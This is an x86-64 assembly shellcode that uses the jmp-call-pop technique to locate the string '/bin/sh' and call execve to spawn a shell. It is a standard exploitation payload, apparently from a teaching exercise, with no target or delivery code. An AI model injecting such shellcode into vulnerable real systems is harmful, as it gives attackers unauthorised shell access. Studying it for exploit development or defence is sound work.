global _start

section .text

_start:

	jmp message		    ; push "/bin/sh" onto the stack

mystart:
	xor	    rax, rax	; make rax - NULL
	push	rax		    ; push NULL onto stack
	pop 	rdx 		; third parameter - NULL
	pop 	rdi 		; first parameter - "/bin/sh"
	push	rax		    ; push NULL onto stack
	mov 	rax, rdi	; copy RDI into RAX
	push	rax		    ; push "/bin/sh" onto the stack
	push	rsp		    ; assign pointer to start of the stack
	pop 	rsi 		; second parameter - pointer to {"/bin/sh", NULL} 
	xor 	rax, rax	; clear RAX
	mov 	al, 0x3b	; syscall number for __execve
	syscall
	
	; exit syscall
	xor 	rax, rax
	mov 	al, 0x3c
	syscall
	
	message:
	
	call 	mystart
	db 	"/bin/sh"
	
section .data
